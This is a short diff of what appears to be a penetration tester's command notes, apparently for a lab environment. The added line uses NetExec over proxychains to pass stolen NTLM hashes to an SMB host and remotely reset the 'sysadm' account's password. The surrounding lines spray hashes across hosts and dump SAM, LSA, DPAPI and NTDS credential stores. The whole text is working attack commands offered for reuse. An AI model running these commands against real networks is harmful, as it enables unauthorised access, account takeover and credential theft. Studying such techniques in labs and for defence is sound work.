@@ -629,6 +629,7 @@ DUMP=''
 echo "$DUMP" | cut -d ':' -f 1 >> usernames; sort -u usernames | tee usernames
 echo "$DUMP" | cut -d ':' -f 3- | sed 's/::.*//' >> hashes; sort -u hashes | tee hashes
 
+proxychains nxc smb 10.129.121.240 -u usernames -H hashes -x 'net user sysadm 123qweasdF!'
 proxychains nxc smb 10.10.10.1 10.10.10.2 -u usernames -H hashes --local-auth --continue-on-success | grep '\[+\]'
 proxychains nxc smb 10.10.10.2 -u '$USERNAME' -H '$HASH' --local-auth --sam | grep ':[0-9]\+:[a-f0-9]\{32\}:[a-f0-9]\{32\}:::' | awk '{print $NF}'
 proxychains nxc smb 10.10.10.2 -u '$USERNAME' -H '$HASH' --local-auth --sam --lsa --dpapi --ntds
